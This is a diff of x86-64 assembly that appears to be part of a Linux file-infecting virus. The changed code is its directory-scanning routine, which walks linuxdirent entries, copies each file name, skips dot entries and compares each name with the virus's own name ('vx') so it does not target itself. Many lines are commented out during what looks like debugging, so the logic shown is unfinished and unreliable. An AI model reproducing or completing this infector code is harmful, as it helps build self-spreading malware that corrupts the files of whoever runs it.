@@ -460,38 +460,50 @@ check_file:
 		cmp rax, 0
 		jb checknext
 		mov r9, rax
+		push r9
 		mov r8, rax
 		mov [r14 + 144], rax
 		xor r12, r12
+	
+	.copy_filename:
 		lea rdi, [r14 + 200] 
 		lea rsi, [rcx + r14 + 618]
-		.copy_filename:
+		.copy_filename_loop:
 			mov byte al, [rsi]
+		;	movsb
 			inc rsi
 			mov byte [rdi], al
 			inc rdi
-			inc r12
+		;	inc r12
 			cmp byte [rsi], 0x0
-			jne .copy_filename
+			jne .copy_filename_loop
 		xor rax, rax
-		push r9
+	
+
 	check_filename:
-		cmp word [r14+200], 0x002e
+		;mov rax, qword [r14 + 200]
+		lea rdi, qword [r14 + 200]
+		;lea rdi, [rcx + r14 + 617]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
+		cmp word [rdi], 0x2e00
+		;cmp word [rcx + r14 + 617], 0x2e00
+		;xor rax, rax
 		je checknext
 		jmp get_vx_name
 	check_vx_name:
 		pop rsi
-		lea rdi, [r14 + 200]
-		xor rcx, rcx
+		;lea rdi, [rcx + r14 + 617]
+		;push rcx
+		;xor rcx, rcx
 		cld
 		.filenameloop:
 			cmpsb
 			jne get_filestat
-			inc cx
+			inc r12
 			inc rdi
 			inc rsi
-			cmp rcx, 5
+			cmp r12, 5
 			jnz .filenameloop
+		;pop rcx
 		jmp checknext
 	get_vx_name:
 		call check_vx_name
@@ -575,9 +587,9 @@ check_file:
 	;is cleared (except for the first two bytes)
 	;so that target filename does not retain leftover chars
 	;from previous filename save
-		lea rdi, [r14 + 201]
-		xor rax, rax
-		mov qword [rdi], 0x01
+		;lea rdi, [r14 + 201]
+		;xor rax, rax
+		;mov qword [rdi], 0x01
 
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
